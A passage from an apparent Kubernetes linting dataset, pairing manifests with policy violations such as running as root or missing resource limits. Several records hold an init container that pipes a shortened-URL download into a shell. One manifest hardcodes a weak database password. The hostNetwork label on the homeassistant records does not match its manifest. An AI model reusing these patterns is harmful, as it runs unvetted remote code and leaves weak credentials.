    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "10341",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hw2-webserver\" has cpu request 0"
  },
  {
    "id": "10342",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "10343",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hw2-webserver\" has memory limit 0"
  },
  {
    "id": "10344",
    "manifest_path": "data/manifests/the_stack_sample/sample_3979.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: value\nspec:\n  containers:\n  - name: hw2-webserver\n    image: i2rdevops/hw2-webserver:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    imagePullPolicy: Always\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: web\n      mountPath: /app\n  volumes:\n  - name: web\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "10345",
    "manifest_path": "data/manifests/the_stack_sample/sample_3980.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnsutils\n  namespace: identityserver-ui\nspec:\n  containers:\n  - name: dnsutils\n    image: gcr.io/kubernetes-e2e-test-images/dnsutils:1.3\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dnsutils\" does not have a read-only root file system"
  },
  {
    "id": "10346",
    "manifest_path": "data/manifests/the_stack_sample/sample_3980.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnsutils\n  namespace: identityserver-ui\nspec:\n  containers:\n  - name: dnsutils\n    image: gcr.io/kubernetes-e2e-test-images/dnsutils:1.3\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dnsutils\" is not set to runAsNonRoot"
  },
  {
    "id": "10347",
    "manifest_path": "data/manifests/the_stack_sample/sample_3980.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnsutils\n  namespace: identityserver-ui\nspec:\n  containers:\n  - name: dnsutils\n    image: gcr.io/kubernetes-e2e-test-images/dnsutils:1.3\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dnsutils\" has cpu request 0"
  },
  {
    "id": "10348",
    "manifest_path": "data/manifests/the_stack_sample/sample_3980.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnsutils\n  namespace: identityserver-ui\nspec:\n  containers:\n  - name: dnsutils\n    image: gcr.io/kubernetes-e2e-test-images/dnsutils:1.3\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dnsutils\" has memory limit 0"
  },
  {
    "id": "10349",
    "manifest_path": "data/manifests/the_stack_sample/sample_3982.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    io.kompose.service: mysql\n  name: mysql\nspec:\n  type: ClusterIP\n  ports:\n  - name: '3306'\n    port: 3306\n    targetPort: 3306\n  selector:\n    io.kompose.service: mysql\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[io.kompose.service:mysql])"
  },
  {
    "id": "10350",
    "manifest_path": "data/manifests/the_stack_sample/sample_3983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: odoo-server\n  namespace: odoo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: odoo-server\n  template:\n    metadata:\n      labels:\n        name: odoo-server\n    spec:\n      containers:\n      - name: odoo-server\n        image: odoo\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: DB_PORT_5432_TCP_ADDR\n          value: localhost\n        - name: DB_PORT_5432_TCP_PORT\n          value: '5432'\n        - name: DB_ENV_POSTGRES_USER\n          value: odoo\n        - name: DB_ENV_POSTGRES_PASSWORD\n          value: '1234'\n        ports:\n        - containerPort: 8069\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"odoo-server\" is using an invalid container image, \"odoo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10351",
    "manifest_path": "data/manifests/the_stack_sample/sample_3983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: odoo-server\n  namespace: odoo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: odoo-server\n  template:\n    metadata:\n      labels:\n        name: odoo-server\n    spec:\n      containers:\n      - name: odoo-server\n        image: odoo\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: DB_PORT_5432_TCP_ADDR\n          value: localhost\n        - name: DB_PORT_5432_TCP_PORT\n          value: '5432'\n        - name: DB_ENV_POSTGRES_USER\n          value: odoo\n        - name: DB_ENV_POSTGRES_PASSWORD\n          value: '1234'\n        ports:\n        - containerPort: 8069\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"odoo-server\" does not have a read-only root file system"
  },
  {
    "id": "10352",
    "manifest_path": "data/manifests/the_stack_sample/sample_3983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: odoo-server\n  namespace: odoo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: odoo-server\n  template:\n    metadata:\n      labels:\n        name: odoo-server\n    spec:\n      containers:\n      - name: odoo-server\n        image: odoo\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: DB_PORT_5432_TCP_ADDR\n          value: localhost\n        - name: DB_PORT_5432_TCP_PORT\n          value: '5432'\n        - name: DB_ENV_POSTGRES_USER\n          value: odoo\n        - name: DB_ENV_POSTGRES_PASSWORD\n          value: '1234'\n        ports:\n        - containerPort: 8069\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"odoo-server\" is not set to runAsNonRoot"
  },
  {
    "id": "10353",
    "manifest_path": "data/manifests/the_stack_sample/sample_3983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: odoo-server\n  namespace: odoo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: odoo-server\n  template:\n    metadata:\n      labels:\n        name: odoo-server\n    spec:\n      containers:\n      - name: odoo-server\n        image: odoo\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: DB_PORT_5432_TCP_ADDR\n          value: localhost\n        - name: DB_PORT_5432_TCP_PORT\n          value: '5432'\n        - name: DB_ENV_POSTGRES_USER\n          value: odoo\n        - name: DB_ENV_POSTGRES_PASSWORD\n          value: '1234'\n        ports:\n        - containerPort: 8069\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"odoo-server\" has memory limit 0"
  },
  {
    "id": "10354",
    "manifest_path": "data/manifests/the_stack_sample/sample_3985.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pricing-service\n  namespace: default\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: pricing-service\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pricing-service])"
  },
  {
    "id": "10355",
    "manifest_path": "data/manifests/the_stack_sample/sample_3986.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: license-rtu-editor\n  labels:\n    app: license-rtu-editor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: license-rtu-editor\n  template:\n    metadata:\n      labels:\n        app: license-rtu-editor\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: license-rtu-editor\n        image: <LICENSE_RTU_EDITOR_IMAGE>\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"license-rtu-editor\" is using an invalid container image, \"<LICENSE_RTU_EDITOR_IMAGE>\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10356",
    "manifest_path": "data/manifests/the_stack_sample/sample_3986.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: license-rtu-editor\n  labels:\n    app: license-rtu-editor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: license-rtu-editor\n  template:\n    metadata:\n      labels:\n        app: license-rtu-editor\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: license-rtu-editor\n        image: <LICENSE_RTU_EDITOR_IMAGE>\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"license-rtu-editor\" does not have a read-only root file system"
  },
  {
    "id": "10357",
    "manifest_path": "data/manifests/the_stack_sample/sample_3986.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: license-rtu-editor\n  labels:\n    app: license-rtu-editor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: license-rtu-editor\n  template:\n    metadata:\n      labels:\n        app: license-rtu-editor\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: license-rtu-editor\n        image: <LICENSE_RTU_EDITOR_IMAGE>\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"license-rtu-editor\" is not set to runAsNonRoot"
  },
  {
    "id": "10358",
    "manifest_path": "data/manifests/the_stack_sample/sample_3986.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: license-rtu-editor\n  labels:\n    app: license-rtu-editor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: license-rtu-editor\n  template:\n    metadata:\n      labels:\n        app: license-rtu-editor\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: license-rtu-editor\n        image: <LICENSE_RTU_EDITOR_IMAGE>\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"license-rtu-editor\" has cpu request 0"
  },
  {
    "id": "10359",
    "manifest_path": "data/manifests/the_stack_sample/sample_3986.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: license-rtu-editor\n  labels:\n    app: license-rtu-editor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: license-rtu-editor\n  template:\n    metadata:\n      labels:\n        app: license-rtu-editor\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: license-rtu-editor\n        image: <LICENSE_RTU_EDITOR_IMAGE>\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_LICENSE_MGT_SERVICE_LABEL>\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"license-rtu-editor\" has memory limit 0"
  },
  {
    "id": "10360",
    "manifest_path": "data/manifests/the_stack_sample/sample_3987.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: db\nspec:\n  ports:\n  - port: 5432\n    name: postgres\n  clusterIP: None\n  selector:\n    app: db\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:db])"
  },
  {
    "id": "10361",
    "manifest_path": "data/manifests/the_stack_sample/sample_3991.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/name: homeassistant\n    app.kubernetes.io/part-of: homeassistant\n    app.kubernetes.io/version: 2021.10.6\n  name: homeassistant\n  namespace: homeassistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: server\n      app.kubernetes.io/name: homeassistant\n      app.kubernetes.io/part-of: homeassistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: server\n        app.kubernetes.io/name: homeassistant\n        app.kubernetes.io/part-of: homeassistant\n        app.kubernetes.io/version: 2021.10.6\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Europe/Berlin\n        image: homeassistant/aarch64-homeassistant:2021.10.6\n        imagePullPolicy: IfNotPresent\n        name: homeassistant\n        ports:\n        - containerPort: 8123\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 400m\n            memory: 1600Mi\n          requests:\n            cpu: 200m\n            memory: 800Mi\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /config\n          name: config\n      serviceAccountName: homeassistant\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: config\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10362",
    "manifest_path": "data/manifests/the_stack_sample/sample_3991.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/name: homeassistant\n    app.kubernetes.io/part-of: homeassistant\n    app.kubernetes.io/version: 2021.10.6\n  name: homeassistant\n  namespace: homeassistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: server\n      app.kubernetes.io/name: homeassistant\n      app.kubernetes.io/part-of: homeassistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: server\n        app.kubernetes.io/name: homeassistant\n        app.kubernetes.io/part-of: homeassistant\n        app.kubernetes.io/version: 2021.10.6\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Europe/Berlin\n        image: homeassistant/aarch64-homeassistant:2021.10.6\n        imagePullPolicy: IfNotPresent\n        name: homeassistant\n        ports:\n        - containerPort: 8123\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 400m\n            memory: 1600Mi\n          requests:\n            cpu: 200m\n            memory: 800Mi\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /config\n          name: config\n      serviceAccountName: homeassistant\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"homeassistant\" does not have a read-only root file system"
  },
  {
    "id": "10363",
    "manifest_path": "data/manifests/the_stack_sample/sample_3991.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/name: homeassistant\n    app.kubernetes.io/part-of: homeassistant\n    app.kubernetes.io/version: 2021.10.6\n  name: homeassistant\n  namespace: homeassistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: server\n      app.kubernetes.io/name: homeassistant\n      app.kubernetes.io/part-of: homeassistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: server\n        app.kubernetes.io/name: homeassistant\n        app.kubernetes.io/part-of: homeassistant\n        app.kubernetes.io/version: 2021.10.6\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Europe/Berlin\n        image: homeassistant/aarch64-homeassistant:2021.10.6\n        imagePullPolicy: IfNotPresent\n        name: homeassistant\n        ports:\n        - containerPort: 8123\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 400m\n            memory: 1600Mi\n          requests:\n            cpu: 200m\n            memory: 800Mi\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /config\n          name: config\n      serviceAccountName: homeassistant\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"homeassistant\" not found"
  },
  {
    "id": "10364",
    "manifest_path": "data/manifests/the_stack_sample/sample_3991.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: server\n    app.kubernetes.io/name: homeassistant\n    app.kubernetes.io/part-of: homeassistant\n    app.kubernetes.io/version: 2021.10.6\n  name: homeassistant\n  namespace: homeassistant\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: server\n      app.kubernetes.io/name: homeassistant\n      app.kubernetes.io/part-of: homeassistant\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: server\n        app.kubernetes.io/name: homeassistant\n        app.kubernetes.io/part-of: homeassistant\n        app.kubernetes.io/version: 2021.10.6\n    spec:\n      containers:\n      - env:\n        - name: TZ\n          value: Europe/Berlin\n        image: homeassistant/aarch64-homeassistant:2021.10.6\n        imagePullPolicy: IfNotPresent\n        name: homeassistant\n        ports:\n        - containerPort: 8123\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /\n            port: http\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 400m\n            memory: 1600Mi\n          requests:\n            cpu: 200m\n            memory: 800Mi\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /config\n          name: config\n      serviceAccountName: homeassistant\n      volumes:\n      - name: config\n        persistentVolumeClaim:\n          claimName: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"homeassistant\" is not set to runAsNonRoot"
  },
  {
    "id": "10365",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"beelogger-service\" does not expose port 3000 for the HTTPGet"
  },
  {
    "id": "10366",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10367",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"beelogger-service\" does not have a read-only root file system"
  },
  {
    "id": "10368",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"beelogger-service\" does not expose port 3000 for the HTTPGet"
  },
  {
    "id": "10369",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"beelogger-service\" is not set to runAsNonRoot"
  },
  {
    "id": "10370",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"beelogger-service\" has cpu request 0"
  },
  {
    "id": "10371",
    "manifest_path": "data/manifests/the_stack_sample/sample_3993.yaml",
